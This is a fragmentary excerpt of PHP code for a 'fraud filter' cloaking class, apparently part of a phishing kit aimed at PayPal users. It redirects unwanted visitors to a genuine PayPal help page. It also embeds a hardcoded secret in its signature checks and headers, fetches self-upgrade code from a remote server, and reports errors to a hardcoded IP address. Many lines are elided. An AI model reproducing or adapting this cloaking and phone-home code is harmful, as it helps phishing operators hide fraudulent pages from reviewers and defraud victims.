...
class FraudFilterDetector_muqtb {
    ...
    function isSignatureValid($sign, $time) {
        $str = '5ebcdb4e-a73b-4f6b-8d71-6d43d5c8290c.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.paypal.com/us/cshelp/personal');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 5ebcdb4e-a73b-4f6b-8d71-6d43d5c8290c',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 5ebcdb4e-a73b-4f6b-8d71-6d43d5c8290c';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 5ebcdb4e-a73b-4f6b-8d71-6d43d5c8290c';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=muqtb&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_muqtb = new FraudFilterDetector_muqtb();
$fraudFilterDetector_muqtb->check();
